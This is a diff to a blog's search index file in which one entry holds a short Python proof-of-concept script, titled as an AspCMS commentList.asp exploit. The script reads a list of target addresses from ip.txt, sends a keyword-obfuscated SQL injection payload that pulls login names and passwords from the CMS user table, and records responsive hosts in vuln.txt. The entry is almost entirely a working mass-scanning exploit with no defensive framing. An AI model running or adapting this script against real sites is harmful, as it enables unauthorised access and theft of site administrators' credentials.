@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL注入漏洞_poc</title>
+    <title>AspCMS commentList.asp_poc</title>
     <url>/2023/02/25/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-poc/</url>
     <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payload_windos = <span class="string">&#x27;/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20&#123;prefix&#125;user&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;check-&gt;&#x27;</span>+ip)</span><br><span class="line">        ip = ip.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        url = ip</span><br><span class="line">        data_windows = requests.get(url+payload_windos,verify=<span class="literal">False</span>).status_code<span class="comment">#请求状态码</span></span><br><span class="line">        <span class="keyword">if</span>  data_windows == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;vuln.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                f.write(ip+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
@@ -14,6 +14,7 @@
       </categories>
       <tags>
         <tag>poc</tag>
+        <tag>SQL注入漏洞</tag>
       </tags>
   </entry>
   <entry>
